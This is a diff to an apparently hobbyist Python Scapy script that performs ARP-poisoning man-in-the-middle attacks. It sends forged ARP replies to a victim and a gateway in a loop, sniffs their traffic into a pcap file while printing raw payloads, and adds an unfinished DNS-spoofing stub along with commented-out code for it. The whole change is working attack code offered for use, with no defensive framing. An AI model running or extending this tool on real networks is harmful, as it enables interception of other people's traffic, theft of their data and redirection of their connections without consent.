@@ -63,18 +63,28 @@ def reARP(gate_mac, victim_mac):
 
 
 def trick(gate_mac, victim_mac):
-  print(gate_mac)
-  print(victim_mac)
   send(ARP(op=2, pdst=victim_ip, psrc=gate_ip, hwdst=victim_mac))
   send(ARP(op=2, pdst=gate_ip, psrc=victim_ip, hwdst=gate_mac))
 
 
-def sniffer():
-    pkts = sniff(iface=interface, count=1000,
+def dns_spoof(dns_pkt):
+  print(dns_pkt)
+  #spoofed_sites = ['businessinsider.com'] # only spoof small set of websites
+
+def sniffer(dns=False):
+    print('Hello!')
+    if dns:
+      print('sniffing...')
+      pkt = sniff(iface=interface, count=1)
+      print('sniffed packet: ')
+      print(pkt.show())
+      return pkt
+    else:
+      pkts = sniff(iface=interface, count=100,
                  prn=lambda x: x.sprintf(" Source: %IP.src% : %Ether.src%, \n"
                                          "%Raw.load% \n\n Reciever: %IP.dst% \n"
                                          "+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+\n"))
-    wrpcap("temp.pcap", pkts)
+      wrpcap("temp.pcap", pkts)
 
 
 def parse_session_file():
@@ -131,11 +141,19 @@ def mitm():
     sys.exit(1)
 
   print("[*] Poisoning Targets...")
-  while 1:
+  run = True
+  while run:
     try:
       trick(gate_mac, victim_mac)
+      #sniffer()
+      #pkt = sniffer(True) # grab single dns packet
+      #print('mitm pkt: ')
+      #print(pkt)
+      #if DNS in pkt[0] and pkt[0][IP].src:
+      #  print('Attempting DNS Spoof...')
+      #  dns_spoof(pkt)
       time.sleep(1.5)
-      # sniffer()
+      sniffer(True)
     except KeyboardInterrupt:
       reARP(gate_mac, victim_mac)
       print("[*] User Requested Shutdown")
